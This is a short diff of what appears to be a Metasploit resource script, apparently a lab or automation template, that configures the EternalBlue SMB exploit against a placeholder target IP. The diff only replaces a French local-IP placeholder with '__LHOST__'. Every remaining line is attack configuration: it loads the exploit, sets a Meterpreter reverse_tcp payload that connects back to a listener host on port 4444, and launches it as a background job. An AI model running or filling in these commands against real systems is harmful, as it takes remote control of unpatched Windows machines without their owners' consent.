@@ -16,7 +16,7 @@ run
 use exploit/windows/smb/ms17_010_eternalblue
 set RHOST __TARGET_IP__
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
-set LHOST <ton_ip_locale>
+set LHOST __LHOST__
 set LPORT 4444
 exploit -j -z
 
